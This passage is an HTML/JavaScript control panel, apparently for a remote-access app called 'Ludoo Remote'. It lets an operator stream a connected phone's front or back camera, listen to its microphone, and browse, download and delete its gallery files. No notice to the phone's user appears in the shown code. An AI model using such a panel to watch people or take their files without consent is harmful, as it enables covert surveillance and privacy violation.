        .video-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.92); z-index:2000; align-items:center; justify-content:center; }
        .video-overlay.active { display:flex; }
        .overlay-video-wrap { position:relative; overflow:hidden; border-radius:12px; touch-action:none; user-select:none; min-width:120px; min-height:80px; }
        #overlayVideo { display:block; width:100%; height:100%; object-fit:contain; transform-origin:center center; pointer-events:none; }
        .overlay-corner-btn { position:absolute; top:10px; z-index:10; background:rgba(0,0,0,.65); border:1px solid rgba(255,255,255,.18); color:#fff; font-size:13px; padding:7px 13px; border-radius:20px; cursor:pointer; backdrop-filter:blur(4px); transition:all .2s; display:flex; align-items:center; gap:5px; white-space:nowrap; }
        .overlay-corner-btn:hover { background:rgba(102,126,234,.85); border-color:#667eea; }
        .overlay-corner-btn.rotate-btn { left:10px; }
        .overlay-corner-btn.close-btn { right:10px; border-color:rgba(244,67,54,.5); color:#ff6b6b; }
        .overlay-corner-btn.close-btn:hover { background:rgba(244,67,54,.85); color:#fff; border-color:#f44336; }
        .overlay-resize-handle { position:absolute; bottom:0; right:0; width:28px; height:28px; cursor:nwse-resize; z-index:11; display:flex; align-items:flex-end; justify-content:flex-end; padding:4px; }
        .overlay-resize-handle::after { content:''; display:block; width:14px; height:14px; border-right:3px solid rgba(255,255,255,.45); border-bottom:3px solid rgba(255,255,255,.45); border-radius:2px; }
        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
        .btn-front { background:#2196F3; color:white; } .btn-front:hover { background:#0b7dda; }
        .btn-back  { background:#9C27B0; color:white; } .btn-back:hover  { background:#7B1FA2; }
        .btn-front.active-cam, .btn-back.active-cam { outline:3px solid #fff; transform:scale(1.06); }
        .btn-voice-start { background:linear-gradient(135deg,#FF6B35,#F7C59F); color:#1a1a1a; font-weight:700; }
        .btn-voice-start:hover { opacity:.88; }
        .btn-voice-stop  { background:linear-gradient(135deg,#c62828,#e53935); color:white; }
        .btn-voice-stop:hover  { opacity:.88; }
        .voice-card { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .voice-status { display:flex; align-items:center; gap:8px; font-size:13px; color:#888; margin-top:10px; }
        .voice-dot { width:8px; height:8px; border-radius:50%; background:#555; transition:all .3s; }
        .voice-dot.active { background:#4CAF50; box-shadow:0 0 8px #4CAF50; animation:pulse 1s infinite; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.4;} }
        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
        .quality-btn.active { background:#667eea; border-color:#667eea; }
        .fps-control { margin-top:16px; }
        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
        .fps-value { text-align:center; font-size:12px; color:#888; }
        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
        .device-item:hover { background:#252525; }
        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
        .device-name { font-size:14px; font-weight:500; }
        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
        .empty-devices { text-align:center; color:#555; padding:20px; }
        .status-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.85); z-index:1000; justify-content:center; align-items:center; }
        .status-modal-content { background:#1a1a1a; border-radius:20px; width:90%; max-width:350px; padding:20px; border:1px solid #667eea; }
        .status-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #2a2a2a; }
        .status-modal-title { font-size:18px; font-weight:600; }
        .status-modal-close { background:none; border:none; color:#888; font-size:24px; cursor:pointer; }
        .status-item { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; font-size:14px; }
        .status-item:last-child { border-bottom:none; }
        .status-label { color:#888; }
        .status-allowed { color:#4CAF50; font-weight:600; }
        .status-denied { color:#f44336; font-weight:600; }
        .status-pending { color:#FF9800; font-weight:600; }
        .battery-bar-small { height:6px; background:#2a2a2a; border-radius:3px; overflow:hidden; width:100px; }
        .battery-fill-small { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); border-radius:3px; }
        .flex-row { display:flex; align-items:center; gap:10px; }
        .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
        .logout-btn:hover { border-color:#f44336; color:#f44336; }
        .header { position:relative; }

        /* GALLERY CSS */
        .gallery-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.92); z-index:3000; overflow-y:auto; padding:20px; }
        .gallery-modal.active { display:block; }
        .gallery-header { display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #2a2a2a; margin-bottom:20px; position:sticky; top:0; background:rgba(0,0,0,.9); z-index:10; }
        .gallery-header h2 { font-size:20px; }
        .gallery-close { background:none; border:none; color:#fff; font-size:28px; cursor:pointer; padding:0 10px; }
        .gallery-close:hover { color:#f44336; }
        .gallery-back { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
        .gallery-back:hover { border-color:#667eea; color:#fff; }
        .gallery-stats { font-size:13px; color:#888; margin-left:12px; }
        .gallery-sync-btn { background:#4CAF50; border:none; color:white; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
        .gallery-sync-btn:hover { opacity:.8; }
        .gallery-sync-btn:disabled { opacity:.5; cursor:not-allowed; }

        /* Folder View */
        .folder-section { margin-bottom:25px; }
        .folder-title { font-size:16px; font-weight:600; color:#667eea; margin-bottom:10px; padding:8px 12px; background:#1a1a1a; border-radius:8px; border-left:3px solid #667eea; }
        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; }
        .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
        .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
        .gallery-item img { width:100%; height:150px; object-fit:cover; display:block; }
        .gallery-item .gallery-item-info { padding:8px 10px; }
        .gallery-item .gallery-item-name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
        .gallery-item .gallery-item-size { font-size:10px; color:#666; }
        .gallery-item.video-item { position:relative; }
        .gallery-item.video-item::after { content:'▶'; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:40px; color:rgba(255,255,255,.8); text-shadow:0 0 20px rgba(0,0,0,.8); }
        .gallery-loading { text-align:center; color:#666; padding:40px; }
        .gallery-empty { text-align:center; color:#666; padding:40px; }
        .gallery-empty span { font-size:48px; display:block; margin-bottom:10px; }
        .folder-list { display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:14px; padding:4px; }
        .folder-card { background:#1a1a1a; border-radius:14px; border:1px solid #2a2a2a; cursor:pointer; padding:22px 14px 16px; text-align:center; transition:all .2s; }
        .folder-card:hover { transform:scale(1.04); border-color:#667eea; background:#222; }
        .folder-card-icon { font-size:40px; margin-bottom:10px; }
        .folder-card-name { font-size:13px; font-weight:600; color:#ddd; margin-bottom:5px; word-break:break-word; }
        .folder-card-count { font-size:11px; color:#666; }
        .folder-files-header { display:flex; align-items:center; gap:12px; margin-bottom:16px; padding:4px 0; }
        .folder-back-btn { background:none; border:1px solid #444; color:#aaa; font-size:13px; padding:6px 14px; border-radius:8px; cursor:pointer; transition:all .2s; }
        .folder-back-btn:hover { border-color:#667eea; color:#667eea; }

        /* Image Viewer */
        .image-viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:4000; align-items:center; justify-content:center; flex-direction:column; }
        .image-viewer.active { display:flex; }
        .image-viewer img, .image-viewer video { max-width:95%; max-height:80vh; object-fit:contain; border-radius:8px; }
        .image-viewer .viewer-controls { display:flex; gap:20px; margin-top:20px; align-items:center; flex-wrap:wrap; justify-content:center; }
        .image-viewer .viewer-btn { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:10px 20px; border-radius:10px; cursor:pointer; font-size:14px; transition:all .2s; }
        .image-viewer .viewer-btn:hover { background:#667eea; border-color:#667eea; }
        .image-viewer .viewer-btn.danger:hover { background:#f44336; border-color:#f44336; }
        .image-viewer .viewer-close { position:absolute; top:20px; right:30px; background:none; border:none; color:#fff; font-size:36px; cursor:pointer; }
        .image-viewer .viewer-close:hover { color:#f44336; }
        .image-viewer .viewer-info { color:#888; font-size:13px; margin-top:10px; text-align:center; }
        .image-viewer .viewer-folder { color:#667eea; font-size:12px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📷 Ludoo Remote</h1>
        <p id="connMode">Tap on device to view status</p>
        <a href="/logout" class="logout-btn">🚪 Logout</a>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
    </div>
    <div class="video-container" id="videoContainer">
        <img id="video"><div id="placeholder" class="video-placeholder"><span>📷</span><br>Select a device first</div>
        <div class="disconnected-overlay" id="disconnectedOverlay"><span>⚠ DEVICE DISCONNECTED</span><span style="font-size:11px;color:#888;font-weight:400">Last frame frozen — waiting to reconnect...</span></div>
        <button class="expand-btn" id="expandBtn" title="Expand">⛶</button>
    </div>
    <div class="video-overlay" id="videoOverlay">
        <div class="overlay-video-wrap" id="overlayWrap">
            <img id="overlayVideo" src="" style="display:none;">
            <div id="overlayPlaceholder" class="video-placeholder" style="display:flex;align-items:center;justify-content:center;height:100%;background:#000;"><div><span style="font-size:36px;">📷</span><br>No stream</div></div>
            <button class="overlay-corner-btn rotate-btn" id="rotateBtn">🔄 Rotate</button>
            <button class="overlay-corner-btn close-btn" id="overlayCloseBtn">✕ Close</button>
            <div class="overlay-resize-handle" id="overlayResizeHandle"></div>
        </div>
    </div>
    <div class="controls">
        <div class="section-title">🎮 CONTROLS</div>
        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-front" id="frontBtn">🤳 FRONT</button><button class="btn btn-back active-cam" id="backBtn">📷 BACK</button></div>
        <div class="section-title">🎨 QUALITY</div>
        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
    </div>
    <div class="voice-card">
        <div class="section-title">🎙️ PCM AUDIO PLAYER</div>
        <div class="button-group" style="margin-bottom:8px;">
            <button class="btn btn-voice-start" id="voiceStartBtn">🎤 START LISTEN</button>
            <button class="btn btn-voice-stop" id="voiceStopBtn">⏹ STOP</button>
        </div>
        <div class="voice-status">
            <div class="voice-dot" id="voiceDot"></div>
            <span id="voiceStatusText">Idle</span>
            <span id="voicePacketCount" style="margin-left:auto;font-size:11px;color:#555;"></span>
        </div>
        <div style="margin-top:8px;display:flex;align-items:center;gap:8px;">
            <span style="font-size:11px;color:#888;">VOL</span>
            <input type="range" id="voiceVolume" min="0" max="200" value="100" step="5"
                style="flex:1;accent-color:#4CAF50;cursor:pointer;">
            <span id="voiceVolLabel" style="font-size:11px;color:#aaa;width:34px;">100%</span>
        </div>
        <div style="margin-top:8px;background:#1a1a1a;border-radius:6px;height:28px;overflow:hidden;position:relative;">
            <div id="voiceLevelBar" style="height:100%;width:0%;background:linear-gradient(90deg,#4CAF50,#8BC34A);border-radius:6px;transition:width 0.08s;"></div>
            <span style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555;pointer-events:none;">AUDIO LEVEL</span>
        </div>
        <div style="margin-top:6px;font-size:10px;color:#444;display:flex;justify-content:space-between;">
            <span id="voiceCodecInfo">PCM 16-bit LE</span>
            <span id="voiceSampleRateInfo">– Hz</span>
            <span id="voiceLatencyInfo">latency –</span>
        </div>
    </div>
    <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
</div>

<!-- GALLERY MODAL -->
<div class="gallery-modal" id="galleryModal">
    <div class="gallery-header">
        <div>
            <button class="gallery-back" onclick="galleryBack()">← Back</button>
            <span style="margin-left:15px;font-size:18px;" id="galleryDeviceName">Gallery</span>
            <span class="gallery-stats" id="galleryStats"></span>
        </div>
        <div>
            <button class="gallery-sync-btn" id="gallerySyncBtn" onclick="syncGallery()">🔄 Sync</button>
            <button class="gallery-close" onclick="closeGallery()">✕</button>
        </div>
    </div>
    <div id="galleryContent">
        <div class="gallery-loading">⏳ Loading gallery...</div>
    </div>
</div>

<!-- IMAGE / VIDEO VIEWER -->
<div class="image-viewer" id="imageViewer">
    <button class="viewer-close" onclick="closeImageViewer()">✕</button>
    <div id="viewerMediaWrap" style="display:flex;align-items:center;justify-content:center;max-width:95%;max-height:80vh;">
        <img id="viewerImage" src="" style="display:none;max-width:100%;max-height:80vh;object-fit:contain;border-radius:8px;">
        <video id="viewerVideo" controls style="display:none;max-width:100%;max-height:80vh;border-radius:8px;background:#000;"></video>
        <div id="viewerLoading" style="text-align:center;padding:40px;color:#aaa;">
            <div style="font-size:48px;margin-bottom:12px;">⏳</div>
            <div id="viewerLoadingText">Loading...</div>
            <div style="margin-top:8px;font-size:11px;color:#555;">File will appear after device responds</div>
        </div>
    </div>
    <div class="viewer-controls">
        <button class="viewer-btn" onclick="prevImage()">◀ Prev</button>
        <span id="viewerCounter" style="color:#888;font-size:13px;">1/1</span>
        <button class="viewer-btn" onclick="nextImage()">Next ▶</button>
        <button class="viewer-btn" onclick="downloadCurrent()">⬇ Download</button>
        <button class="viewer-btn danger" onclick="deleteImage()">🗑️ Delete</button>
    </div>
    <div class="viewer-info" id="viewerInfo"></div>
</div>


<!-- STATUS MODAL -->
<div class="status-modal" id="statusModal" onclick="closeStatusModal()">
    <div class="status-modal-content" onclick="event.stopPropagation()">
        <div class="status-modal-header">
            <span class="status-modal-title" id="modalDeviceName">Device Info</span>
            <button class="status-modal-close" onclick="closeStatusModal()">✕</button>
        </div>
        <div id="modalContent"></div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io({ transports: ['websocket', 'polling'] });
    let wsReady = false;

    socket.on('connect', () => {
        wsReady = true;
        document.getElementById('connMode').textContent = '⚡ WebSocket connected';
    });
    socket.on('disconnect', () => {
        wsReady = false;
        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected — using HTTP';
    });

    socket.on('device_update', (data) => {
        const idx = currentDevices.findIndex(d => d.id === data.id);
        if (idx !== -1) {
            currentDevices[idx] = { ...currentDevices[idx], ...data };
        } else {
            currentDevices.push(data);
        }
        renderDeviceList();
        if (selectedDeviceId === data.id) checkSelectedDeviceStatus(currentDevices);
    });

    socket.on('frame', (data) => {
        if (!isStreaming || !data.image) return;
        const idMatch = data.deviceId === selectedDeviceId;
        const singleDevice = currentDevices.filter(d => d.isConnected).length <= 1;
        if (!idMatch && !singleDevice) return;
        if ((data.timestamp || 0) <= lastFrameTs) return;
        lastFrameTs = data.timestamp || Date.now();
        updateFrame('data:image/jpeg;base64,' + data.image);
    });

    let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
    let userStoppedStream = false;
    let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;

    // Gallery variables
    let currentGalleryData = null;
    let currentGalleryFiles = [];
    let currentViewerIndex = 0;
    let currentDeviceIdForGallery = null;
    let currentFolderData = {};
    let currentFolderName = null;
    let galleryInFolderView = false;

    const video = document.getElementById('video'),
          placeholder = document.getElementById('placeholder'),
          deviceCountSpan = document.getElementById('deviceCount'),
          fpsCountSpan = document.getElementById('fpsCount'),
          devicesList = document.getElementById('devicesList'),
          fpsSlider = document.getElementById('fpsSlider'),
          fpsLabel = document.getElementById('fpsLabel'),
          disconnectedOverlay = document.getElementById('disconnectedOverlay'),
          overlayVideo = document.getElementById('overlayVideo'),
          overlayPlaceholder = document.getElementById('overlayPlaceholder'),
          overlayWrap = document.getElementById('overlayWrap'),
          videoOverlay = document.getElementById('videoOverlay');

    function updateFrame(src) {
        video.src = src;
        video.style.display = 'block';
        placeholder.style.display = 'none';
        disconnectedOverlay.classList.remove('show');
        if (!userStoppedStream) wasStreaming = true;
        if (videoOverlay.classList.contains('active')) {
            overlayVideo.src = src;
            overlayVideo.style.display = 'block';
            overlayPlaceholder.style.display = 'none';
        }
        frameCount++;
        const now = Date.now();
        if (now - lastFpsUpdate >= 1000) {
            fpsCountSpan.textContent = frameCount;
            frameCount = 0;
            lastFpsUpdate = now;
        }
    }

    function startFramePoll() {
        stopFramePoll();
        const fps = parseInt(fpsSlider.value) || 15;
        const interval = Math.max(50, Math.round(1000 / fps));
        framePollTimer = setInterval(() => {
            if (!selectedDeviceId || !isStreaming) return;
            fetch('/api/frame/' + selectedDeviceId)
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.image && data.ts > lastFrameTs) {
                        lastFrameTs = data.ts;
                        updateFrame('data:image/jpeg;base64,' + data.image);
                    }
                }).catch(() => {});
        }, interval);
    }
    function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }

    function sendCommand(command, value) {
        if (!selectedDeviceId) { alert('Select a device first'); return; }
        if (wsReady) {
            socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
        } else {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
            }).catch(() => {});
        }
    }

    // ========== GALLERY FUNCTIONS ==========

    function openGallery(deviceId) {
        const device = currentDevices.find(d => d.id === deviceId);
        if (!device) {
            alert('Device not found');
            return;
        }

        currentDeviceIdForGallery = deviceId;
        document.getElementById('galleryDeviceName').textContent = '📱 ' + device.name;
        document.getElementById('galleryModal').classList.add('active');
        document.getElementById('galleryContent').innerHTML = '<div class="gallery-loading">⏳ Loading gallery...</div>';
        document.getElementById('galleryStats').textContent = '';
        document.getElementById('gallerySyncBtn').disabled = false;
        document.getElementById('gallerySyncBtn').textContent = '🔄 Sync';

        loadGallery(deviceId);
    }

    function loadGallery(deviceId) {
        fetch('/api/gallery/' + deviceId)
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    currentGalleryData = data;
                    currentGalleryFiles = data.files || [];
                    currentFolderData = data.folders || {};
                    document.getElementById('galleryStats').textContent =
                        data.images + ' images • ' + data.videos + ' videos • ' + data.count + ' total • ' + data.folderCount + ' folders';
                    showFolderList();
                } else {
                    document.getElementById('galleryContent').innerHTML =
                        '<div class="gallery-empty"><span>📭</span>No files found</div>';
                }
            })
            .catch(() => {
                document.getElementById('galleryContent').innerHTML =
                    '<div class="gallery-empty"><span>❌</span>Error loading gallery</div>';
            });
    }

    function showFolderList() {
        galleryInFolderView = false;
        currentFolderName = null;
        const folders = currentFolderData;
        if (!folders || Object.keys(folders).length === 0) {
            document.getElementById('galleryContent').innerHTML =
                '<div class="gallery-empty"><span>📭</span>No folders found</div>';
            return;
        }
        const sortedFolders = Object.keys(folders).sort();
        let html = '<div class="folder-list">';
        sortedFolders.forEach(folderName => {
            const files = folders[folderName];
            const imgCount = files.filter(f => f.type !== 'video').length;
            const vidCount = files.filter(f => f.type === 'video').length;
            const subtitle = (imgCount > 0 ? imgCount + ' photos' : '') +
                             (imgCount > 0 && vidCount > 0 ? ' • ' : '') +
                             (vidCount > 0 ? vidCount + ' videos' : '');
            html += '<div class="folder-card" onclick="openFolder(\'' + folderName.replace(/'/g, "\\'") + '\')">' +
                '<div class="folder-card-icon">📁</div>' +
                '<div class="folder-card-name">' + folderName + '</div>' +
                '<div class="folder-card-count">' + subtitle + '</div>' +
            '</div>';
        });
        html += '</div>';
        document.getElementById('galleryContent').innerHTML = html;
    }

    function openFolder(folderName) {
        galleryInFolderView = true;
        currentFolderName = folderName;
        const files = currentFolderData[folderName] || [];

        // Build folder-scoped file list for prev/next navigation within folder
        currentGalleryFiles = (currentGalleryData && currentGalleryData.files) ? currentGalleryData.files : [];

        let html = '<div class="folder-files-header">' +
            '<button class="folder-back-btn" onclick="showFolderList()">← Folders</button>' +
            '<span style="font-size:15px;font-weight:600;color:#ddd;">📁 ' + folderName + '</span>' +
            '<span style="font-size:12px;color:#666;">(' + files.length + ' files)</span>' +
        '</div>' +
        '<div class="gallery-grid">';

        files.forEach(file => {
            const isVideo = file.type === 'video';
            const sizeMB = (file.size / (1024 * 1024)).toFixed(1);
            const date = new Date(file.date).toLocaleDateString();
            const globalIndex = currentGalleryFiles.findIndex(f => f.name === file.name);
            html += '<div class="gallery-item ' + (isVideo ? 'video-item' : '') + '" onclick="openImageViewer(' + globalIndex + ')">' +
                '<div style="background:#1a1a1a;height:150px;display:flex;align-items:center;justify-content:center;font-size:48px;color:#555;">' +
                    (isVideo ? '🎬' : '📷') +
                '</div>' +
                '<div class="gallery-item-info">' +
                    '<div class="gallery-item-name">' + file.name + '</div>' +
                    '<div class="gallery-item-size">' + sizeMB + 'MB • ' + date + '</div>' +
                '</div>' +
            '</div>';
        });

        html += '</div>';
        document.getElementById('galleryContent').innerHTML = html;
    }

    function galleryBack() {
        if (galleryInFolderView) {
            showFolderList();
        } else {
            closeGallery();
        }
    }

    function syncGallery() {
        if (!currentDeviceIdForGallery) return;
        
        const btn = document.getElementById('gallerySyncBtn');
        btn.disabled = true;
        btn.textContent = '⏳ Syncing...';
        
        // Send sync command to device
        if (wsReady) {
            socket.emit('send_command', { 
                deviceId: currentDeviceIdForGallery, 
                command: 'gallery_sync',
                value: null 
            });
        } else {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    deviceId: currentDeviceIdForGallery, 
                    command: 'sync_gallery' 
                })
            }).catch(() => {});
        }
        
        // Wait 3 seconds then reload
        setTimeout(() => {
            loadGallery(currentDeviceIdForGallery);
            btn.disabled = false;
            btn.textContent = '🔄 Sync';
        }, 3000);
    }

    function openImageViewer(index) {
        if (!currentGalleryFiles || currentGalleryFiles.length === 0) return;
        currentViewerIndex = index;
        loadImageForViewer(index);
        document.getElementById('imageViewer').classList.add('active');
    }

    function loadImageForViewer(index) {
        const file = currentGalleryFiles[index];
        if (!file) return;

        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + currentGalleryFiles.length;

        // Show folder name from stored folder or path
        let folder = file.folder || file.albumName || file.bucketName || '';
        if (!folder && file.path) {
            const parts = file.path.split('/');
            const skip = ['0','emulated','storage','sdcard','Android','media'];
            for (let i = parts.length - 2; i >= 0; i--) {
                if (parts[i] && !skip.includes(parts[i]) && !parts[i].includes('.')) {
                    folder = parts[i]; break;
                }
            }
        }
        document.getElementById('viewerInfo').innerHTML =
            (folder ? '<span class="viewer-folder">📁 ' + folder + '</span> • ' : '') +
            file.name + ' • ' +
            (file.size / (1024 * 1024)).toFixed(1) + 'MB • ' +
            new Date(file.date).toLocaleString();

        const deviceId = currentDeviceIdForGallery;
        const isVideo = file.type === 'video';

        // Reset state
        const imgEl = document.getElementById('viewerImage');
        const vidEl = document.getElementById('viewerVideo');
        const loadEl = document.getElementById('viewerLoading');
        const loadTxt = document.getElementById('viewerLoadingText');
        imgEl.style.display = 'none'; imgEl.src = '';
        vidEl.style.display = 'none'; vidEl.src = ''; vidEl.pause && vidEl.pause();
        loadEl.style.display = 'block';
        loadTxt.textContent = isVideo ? '⏳ Requesting video from device...' : '⏳ Requesting image from device...';

        fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name))
            .then(r => r.json())
            .then(data => {
                if (data.success && data.data) {
                    loadEl.style.display = 'none';
                    if (isVideo) {
                        vidEl.src = 'data:video/mp4;base64,' + data.data;
                        vidEl.style.display = 'block';
                    } else {
                        imgEl.src = 'data:image/jpeg;base64,' + data.data;
                        imgEl.style.display = 'block';
                    }
                } else if (data.pending) {
                    loadTxt.textContent = '📤 Command sent — waiting for device to upload file...';
                    setTimeout(() => loadImageForViewer(index), 4000);
                } else {
                    loadTxt.textContent = '❌ File not available. Try syncing gallery first.';
                }
            })
            .catch(() => {
                loadTxt.textContent = '❌ Connection error';
            });
    }

    function closeImageViewer() {
        const vid = document.getElementById('viewerVideo');
        if (vid) { vid.pause(); vid.src = ''; }
        document.getElementById('imageViewer').classList.remove('active');
    }

    function prevImage() {
        if (currentViewerIndex > 0) {
            currentViewerIndex--;
            loadImageForViewer(currentViewerIndex);
        }
    }

    function nextImage() {
        if (currentViewerIndex < currentGalleryFiles.length - 1) {
            currentViewerIndex++;
            loadImageForViewer(currentViewerIndex);
        }
    }

    function downloadCurrent() {
        const file = currentGalleryFiles[currentViewerIndex];
        const img = document.getElementById('viewerImage');
        const vid = document.getElementById('viewerVideo');
        const src = (img.style.display !== 'none' && img.src) ? img.src :
                    (vid.style.display !== 'none' && vid.src) ? vid.src : '';
        if (src && src.startsWith('data:')) {
            const link = document.createElement('a');
            link.href = src;
            link.download = file?.name || 'file';
            link.click();
        } else {
            alert('File not loaded yet. Wait for it to appear first.');
        }
    }
    function downloadImage() { downloadCurrent(); }

    function deleteImage() {
        if (!confirm('Delete this file?')) return;
        const file = currentGalleryFiles[currentViewerIndex];
        if (!file) return;

        fetch('/api/gallery/file/' + currentDeviceIdForGallery + '/' + encodeURIComponent(file.name), {
            method: 'DELETE'
        })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                alert('File deleted');
                closeImageViewer();
                loadGallery(currentDeviceIdForGallery);
            }
        })
        .catch(() => alert('Delete failed'));
    }

    function closeGallery() {
        document.getElementById('galleryModal').classList.remove('active');
        closeImageViewer();
    }

    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            if (document.getElementById('imageViewer').classList.contains('active')) {
                closeImageViewer();
            } else if (document.getElementById('galleryModal').classList.contains('active')) {
                closeGallery();
            }
        }
        if (e.key === 'ArrowLeft') prevImage();
        if (e.key === 'ArrowRight') nextImage();
    });

    document.getElementById('startBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        userStoppedStream = false;
        sendCommand('start');
        isStreaming = true; wasStreaming = false;
        disconnectedOverlay.classList.remove('show');
        startFramePoll();
    };
    document.getElementById('stopBtn').onclick = () => {
        if (!selectedDeviceId) return;
        userStoppedStream = true;
        sendCommand('stop');
        isStreaming = false; wasStreaming = false;
        stopFramePoll();
        video.src = ''; video.style.display = 'none';
        placeholder.style.display = 'block';
        disconnectedOverlay.classList.remove('show');
        fpsCountSpan.textContent = '0';
        videoOverlay.classList.remove('active');
        overlayVideo.src = ''; overlayVideo.style.display = 'none';
        overlayPlaceholder.style.display = 'flex';
    };
    function setCameraBtn(cam) {
        document.getElementById('frontBtn').classList.toggle('active-cam', cam === 'front');
        document.getElementById('backBtn').classList.toggle('active-cam', cam === 'back');
    }
    document.getElementById('frontBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        sendCameraFlip('front');
    };
    document.getElementById('backBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        sendCameraFlip('back');
    };
    function sendCameraFlip(camera) {
        setCameraBtn(camera);
        if (wsReady) {
            socket.emit('send_command', { deviceId: selectedDeviceId, command: 'flip', value: camera });
        } else {
            fetch('/api/flip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: selectedDeviceId, camera })
            }).catch(() => {});
        }
    }

    document.querySelectorAll('.quality-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            sendCommand('quality', parseInt(btn.dataset.quality));
        };
    });
    fpsSlider.oninput = () => {
        const fps = parseInt(fpsSlider.value);
        fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
        sendCommand('fps', fps);
        if (isStreaming) startFramePoll();
    };

    let overlayRotation = 0;
    function setDefaultOverlaySize() {
        const vw = window.innerWidth, vh = window.innerHeight;
        let w = Math.round(vw * 0.88), h = Math.round(w * 9 / 16);
        if (h > vh * 0.82) { h = Math.round(vh * 0.82); w = Math.round(h * 16 / 9); }
